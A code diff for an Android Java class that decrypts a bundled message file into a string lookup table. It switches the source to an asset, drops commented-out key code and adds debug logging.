@@ -19,11 +19,13 @@ import android.content.res.Resources;
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
+import com.android.networking.util.Utils;
 
 public class MessagesDecrypt {
 	private static final String TAG = "MessageDecrypt";
 
 	final HashMap<String, String> messages = new HashMap<String, String>();
+
 
 	public MessagesDecrypt(Context context) {
 
@@ -33,13 +35,12 @@ public class MessagesDecrypt {
 
 		try {
 
-			final Resources resources = context.getResources();
-			final InputStream stream = resources.openRawResource(R.raw.messages);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (MessagesDecrypt)");
+			}
 
-			// long p = 6502353731424260395L; //0x5A3D00448D7A912B;
-			// String sp = Long.toString(p, 16);
+			InputStream stream = Utils.getAssetStream("m.bin");
 
-			// SecretKey key = produceKey("0x" + sp.toUpperCase());
 			final SecretKey key = produceKey(Cfg.RNDMSG);
 
 			if (Cfg.DEBUG) {
@@ -47,7 +48,7 @@ public class MessagesDecrypt {
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (init): stream=" + stream.available());
+
 				Check.log(TAG + " (init): key=" + ByteArray.byteArrayToHex(key.getEncoded()));
 			}
 
@@ -57,8 +58,8 @@ public class MessagesDecrypt {
 			final IvParameterSpec ivSpec = new IvParameterSpec(iv);
 
 			cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
+			
 			final CipherInputStream cis = new CipherInputStream(stream, cipher);
-
 			final BufferedReader br = new BufferedReader(new InputStreamReader(cis));
 
 			while (true) {
@@ -79,9 +80,14 @@ public class MessagesDecrypt {
 					Check.asserts(messages.containsKey(kv[0]), "strange hashmap behaviour"); //$NON-NLS-1$
 				}
 			}
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (MessagesDecrypt), messages.size: " + messages.size());
+			}
 
 		} catch (final Exception ex) {
 			if (Cfg.EXCEPTION) {
+				Check.log(TAG + " Exception");
 				Check.log(ex);
 			}
 
